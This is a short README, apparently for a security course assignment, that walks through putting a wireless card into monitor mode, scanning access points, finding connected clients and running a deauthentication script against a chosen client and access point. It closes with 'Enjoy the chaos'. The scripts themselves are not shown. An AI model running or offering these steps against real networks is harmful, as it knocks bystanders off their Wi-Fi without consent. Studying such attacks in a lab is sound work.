# Course Asignments

## Environment ##

We dont want to pollute our environement, if you dont care go to step 2

#### Step 1 - Setup virtual environment
Install venv -   ```apt-get install python3-venv```
Create venv  ```python3 -m venv wifi-deauth```
Activate environemnt ```source wifi-deauth/bin/activate```


#### Step 2 - Install requirements
run ```pip install -r requirements.txt```


#### Step 3 - Activate monitoring
Set value `wlan1` interface according to your environment
```iw dev wlan1 interface add wlan0mon type monitor```
```ifconfig wlan0mon up```


#### Step 5 - Scan for access points
```python3 scan_wifi.py```

Open another terminal tab

#### Step 6 - Find Connected Clients
```python3 find_ap_clients.py BSSID```

#### Step 7 - Execute deauth
``` python3 deauth_client.py TARGET_BSSID ACCESS_POINT_BSSID -v```

#### Step 8 - Enjoy the chaos :-)

### Troubleshooting 

**Problem:** 
```No such file or directory: b'liblibc.a'``` this problem occures on python 3.9+
**Solution:** 
```cd /usr/lib/x86_64-linux-gnu/```
```ln -s -f libc.a liblibc.a```


### Code sources